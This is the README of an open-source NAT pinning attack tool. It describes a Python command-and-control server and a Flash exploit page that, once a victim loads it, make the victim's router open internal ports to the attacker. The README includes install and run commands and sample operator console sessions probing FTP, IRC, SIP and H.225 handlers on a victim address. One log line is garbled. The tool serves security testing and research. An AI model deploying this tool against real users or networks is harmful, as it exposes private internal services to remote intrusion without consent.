NATpinning
===============
This tool is based of the original NAT pinning proof-of-concept by Samy Kamkar: http://samy.pl/natpin/.
Nat handler modules are used by the kernel to keep track of protocols on natted networks that require additional communication channels to be opened for normal operations. These modules might be susceptible to abuse if/when they do not strictly adhere to RFCs. They might for instance allow the exposure of assigned ports, where only random port ranges should be allowed, or allow exposure of ports on a third party.

Samy's original proof-of-concept was javascript based, which brought with it several shortcommings:

	- client-response sequences might be broken due to additional HTTP headers
	- opening some ports might be blocked by browsers (e.g.: 6667 for irc on Firefox)

To overcome these issues I used flash as client side component. This allowed the use of Flash sockets, which don't have the extra overhead of HTTP headers and are not restricted by browser policies. 
I also attempted to extend this proof-of-concept to a more mature state by creating a server side tool which supports several protocols and gives some level of control over the client behavior.


How it works
============
The suite consists of of a server compnent (python) and a client component (web page).

The server is a python script which needs to be run from an Internet based host, with a public IP assigned to it and not firewalled.
Once the script is running it will open dummy services (irc, ftp, sip ), a flash policy server, a web service and a command-and-control service.

The client is the combination of HTML, JavaScript and, most importantly, a AS3 (Actionscript 3) flash file. 
When the victim loads the exploit page, the flash file will connect to the command service and register itself.
At this point it is possible to start testing for possible natpinning issues using the command server by instructing the client to initiate sessions for the different protocols.

When succesfull nat pinning is detected the user controlling the server can drop to shell and initiate a connection back to the newly exposed port using their favorite tool.

Installation
==============
Tested on xubuntu and backtrack, requires python 2.7
to install:
git clone https://github.com/allodoxaphobia/natpinning.git


Usage
==============
on the server: sudo ./run.py

Usage: run.py 

Options:
  -h, --help  show this help message and exit
  --no-web    Do not run the internal web service (port 80).
  --no-flash  Do not run the internal flash policy service (port 843).
  -v VERBOSE  Verbosity level, default is 2, set to 0 if you like a lot of
              output.

Example 1: Testing for FTP NAT pinning (failed)
==================================================

On the server: sudo ./run.py

 $ sudo ./run.py -v 0
 Command Server : Started
 Web Se1.2.3.4d
 Flash Policy Server : Started
 FTP Server : Started
 IRC Server : Started
 SIP Server : Started
 H225 Server : Started
 Services running, press CTRL-C to exit.
 One shell to rule them all

Assuming 1.2.3.4 is IP address of the server, open http://1.2.3.4/ in a browser on the client side:
 This page intentionally left blank. Tests are in progress.
 Usage: http://server/exploit.html?ci=ip_of_client

Same time on the server side:
 Web Server : Received connection from ::ffff:1.2.3.4 on port 80
 Web Server : Victim requested page: exploit.html
 Web Server : ---User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0

Open http://1.2.3.4/exploit.html?ci=192.168.1.44 in a browser on the client side:
 This page intentionally left blank. Tests are in progress.

Same time on the server side:
 Web Server : Received connection from ::ffff:1.2.3.4 on port 80
 Web Server : Victim requested page: exploit.html?ci=192.168.1.44
 Web Server : ---User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0
 Web Server : Victim requested page: exploit.swf
 Web Server : ---User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0
 Flash Policy Server : Received connection from ::ffff:1.2.3.4 on port 843
 Flash Policy Server : FLASH policy file request
 Command Server : Received connection from ::ffff:1.2.3.4 on port 60003
 Command Server : New client registered as ::ffff:1.2.3.4-192.168.1.44

 np> list clients
    ID	Client ID			Address
 --------------------------------------------------------------------------
    0.   ::ffff:1.2.3.4-192.168.1.44		::ffff:1.2.3.4		197

 np> test 0 ftp 192.168.1.44 22
 Command Server : ::ffff:1.2.3.4-192.168.1.44 : send 20140112140348852654
 FTP Server : Received connection from ::ffff:1.2.3.4 on port 21
 FTP Server : Callback expected on 192.168.1.44:22
 FTP Server : FTP Received PORT + LIST callback request for 192.168.1.44 on port 22
 Test 20140112140348852654 FAILED

Examples (irc/sip/h225):
========================

np> test 0 irc 192.168.1.4 22
np> Command Server : ::ffff:85.234.199.198-192.168.1.4 : send 20140112145140604761
IRC Server : Received connection from ::ffff:85.234.199.198 on port 6667
IRC Server : IRC Received DCC CHAT callback request for 192.168.1.4 on port 22
Test 20140112145140604761 FAILED

np> test 0 sip 192.168.1.4 22
np> Command Server : ::ffff:85.234.199.198-192.168.1.4 : send 20140112145205576743
SIP Server : Received connection from ::ffff:85.234.199.198 on port 5060
SIP Server : SIP REGISTER callback (UDP) received for 192.168.1.4 on port 22
Test 20140112145205576743 FAILED

np> test 0 h225 192.168.1.4 22
np> Command Server : ::ffff:85.234.199.198-192.168.1.4 : send 20140112145230712736
H225 Server : Received connection from ::ffff:85.234.199.198 on port 1720
H225 Server : Q931.Type: 7
20140112145230712736
H225 Server : Q931.PDU Length: 76
Test 20140112145230712736 FAILED


License
==============
This tool was created by Gremwell (http://www.gremwell.com) and released under GNU GPL v3. 
